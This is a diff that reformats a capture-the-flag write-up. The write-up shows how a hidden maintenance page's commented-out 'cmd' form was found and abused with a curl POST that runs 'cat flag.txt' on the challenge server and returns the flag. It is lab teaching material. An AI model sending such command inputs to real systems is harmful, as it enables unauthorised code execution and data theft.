@@ -41,7 +41,7 @@ Now we navigate to the disallowed page, `/maintenance_foo_bar_deadbeef_12345.htm
 
 So the page tells us to *run a command*.  Lets looks at the source of the page to see if their are any hints on how to do this:
 ```
-*...snip...*
+...snip...
 
         <!--
             Disabled for being insecure... oops!
@@ -49,7 +49,7 @@ So the page tells us to *run a command*.  Lets looks at the source of the page t
             <input name="cmd"/>
         </form>-->
 
-*...snip...*
+...snip...
 ```
 
 <br />
@@ -59,7 +59,7 @@ Lets use `curl` to send a POST request to this insecure page with the parameter 
 
 curl http://challenge.acictf.com:27856/secret_maintenance_foo_543212345 -X POST --form cmd='cat flag.txt'
 
-*...snip...*
+...snip...
 
 <h1>Maintenance</h1>
         <!--
@@ -69,10 +69,10 @@ curl http://challenge.acictf.com:27856/secret_maintenance_foo_543212345 -X POST 
         </form>-->
         <p>Result: ACI{ccdcb229da85c8d0a6a239edb19} </p>
 
-*...snip...*  
+...snip...
 ```
 
 <br />
 
-##Flag: ACI{ccdcb229da85c8d0a6a239edb19}
+## Flag: ACI{ccdcb229da85c8d0a6a239edb19}
 
